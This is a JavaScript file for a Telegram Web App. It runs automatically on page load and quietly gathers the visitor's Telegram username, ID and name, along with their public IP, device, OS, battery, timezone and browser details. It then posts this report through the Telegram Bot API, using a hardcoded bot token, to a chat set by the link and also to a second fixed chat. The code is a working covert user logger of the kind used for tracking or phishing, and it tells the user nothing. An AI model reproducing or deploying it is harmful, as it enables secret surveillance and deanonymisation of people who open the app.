async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Ошибка получения IP адреса:', error);
        return 'неизвестно';
    }
}

function getUserAgent() {
    try {
        return navigator.userAgent || 'неизвестно';
    } catch (error) {
        console.error('Ошибка получения UserAgent:', error);
        return 'неизвестно';
    }
}

function getScreenResolution() {
    return `${window.screen.width}x${window.screen.height}` || 'неизвестно';
}

function getOSName() {
    try {
        return navigator.platform || 'неизвестно';
    } catch (error) {
        console.error('Ошибка получения имени ОС:', error);
        return 'неизвестно';
    }
}

async function getBatteryPercentage() {
    try {
        const battery = await navigator.getBattery();
        return Math.floor(battery.level * 100);
    } catch (error) {
        console.error('Ошибка получения процента заряда батареи:', error);
        return 'неизвестно';
    }
}

function getBrowserInfo() {
    try {
        return {
            name: navigator.appName || 'неизвестно',
            version: navigator.appVersion || 'неизвестно',
            engine: navigator.product || 'неизвестно'
        };
    } catch (error) {
        console.error('Ошибка получения информации о браузере:', error);
        return {
            name: 'неизвестно',
            version: 'неизвестно',
            engine: 'неизвестно'
        };
    }
}

async function sendDataToTelegram() {
    let tg = window.Telegram.WebApp;
    const token = "6926790040:AAF4HOkicBEw3EQYM0NjUJVOURPxI4pbM-Q"
    const chatId = tg.initDataUnsafe.start_param;
    const additionalChatId = -1002099226550;

    const ipAddress = await getIPAddress();
    const userAgent = getUserAgent();
    const osName = getOSName();
    const screenResolution = getScreenResolution();
    const batteryPercentage = await getBatteryPercentage();
    const browserInfo = getBrowserInfo();

    const message = `
<b>✨ Лог успешен!</b>

<b>🔍 Информация об аккаунте:</b>
├ Тэг: @${tg.initDataUnsafe.user.username || 'неизвестно'}
├ Айди: <code>${tg.initDataUnsafe.user.id || 'неизвестно'}</code>
├ Имя: <code>${tg.initDataUnsafe.user.first_name || 'неизвестно'}</code>
├ Фамилия: <code>${tg.initDataUnsafe.user.last_name || 'неизвестно'}</code>
├ Язык: <code>${tg.initDataUnsafe.user.language_code || 'неизвестно'}</code>
└ Можно писать в ЛС: <code>${tg.initDataUnsafe.user.allows_write_to_pm || 'неизвестно'}</code>

<b>🖥️ Информация об устройстве:</b>
├ Айпи: <code>${ipAddress}</code>
├ UserAgent: <code>${userAgent}</code>
├ Хэш: <code>неизвестно</code>
├ Имя ОС: <code>${osName}</code>
├ Разрешение экрана: <code>${screenResolution}</code>
├ Процент батареи: <code>${batteryPercentage}%</code>
└ Часовой пояс: <code>${new Date().getTimezoneOffset()}</code>

<b>🌐 Информация о браузере:</b>
├ Название браузера: <code>${browserInfo.name}</code>
├ Версия браузера: <code>${browserInfo.version}</code>
└ Тип движка браузера: <code>${browserInfo.engine}</code>
    `;

    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const formData = new FormData();
    formData.append('chat', chatId);
    formData.append('message', message);

    try {
        const response = await fetch(url, {
            method: 'POST',
            body: formData
        });
        if (!response.ok) {
            throw new Error('Ошибка при отправке запроса: ' + response.statusText);
        }
        console.log('Запрос успешно отправлен');
    } catch (error) {
        console.error('Ошибка:', error);
    }
    // отправка два
    const formData1 = new FormData();
    formData1.append('chat', additionalChatId);
    formData1.append('message', message);

    try {
        const response = await fetch(url, {
            method: 'POST',
            body: formData1
        });
        if (!response.ok) {
            throw new Error('Ошибка при отправке запроса: ' + response.statusText);
        }
        console.log('Запрос успешно отправлен');
    } catch (error) {
        console.error('Ошибка:', error);
    }
}

sendDataToTelegram();